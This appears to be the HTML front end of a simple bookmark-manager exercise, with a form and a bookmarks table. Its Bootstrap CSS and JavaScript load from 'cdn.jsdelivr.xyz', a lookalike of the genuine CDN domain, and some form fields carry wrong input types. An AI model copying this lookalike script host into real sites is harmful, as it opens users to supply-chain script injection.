<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
    <link rel="stylesheet" href="./style.css">
   
   
     <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
    <title>Document</title>

</head>
<body>
    <div class="container  ">
        <h1 class="mt-5  mb-5  " >Bookmarker</h1>

        <div class="main pb-4">
            <div class="text">
                <i class="fa-solid fa-bookmark"></i>
           
            <h2 class="fw-bold">Bookmark your favorite sites</h2>
            <i class="fa-solid fa-bookmark"></i>
            </div>

            <div class="form  ">
                <div class="container mt-5 mx-3  ">

                
                <div class="mb-3 text-start">
                    <label for="exampleInputEmail1" class="form-label fs-5 fw-bold ">Site Name</label>
                    <input type="email" class="form-control" id="siteName" aria-describedby="emailHelp">
                    
                  </div>
                  <div class="mb-3 text-start">
                    <label for="exampleInputPassword1" class="form-label fs-5 fw-bold">Site URL</label>
                    <input type="password" class="form-control" id="siteUrl">
                  </div>
                
                </div>
                  <button onclick="add_site()"   type="submit" class="btn btn-danger mt-3 sub_btn">Submit</button>
            </div>
        </div>
        
        <div class="table_data mt-4 ">
            <table class="table text-center">
                <thead>
                  <tr>
                    <th scope="col">Index</th>
                    <th scope="col">Website Name</th>
                    <th scope="col">Visit</th>
                    <th scope="col">Delete</th>
                  </tr>
                </thead>
                <tbody id="tbody">


                </tbody>
            </table>
        </div>
    </div>
   

    <script src="./main.js"></script>
    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>

  </body>
</html>
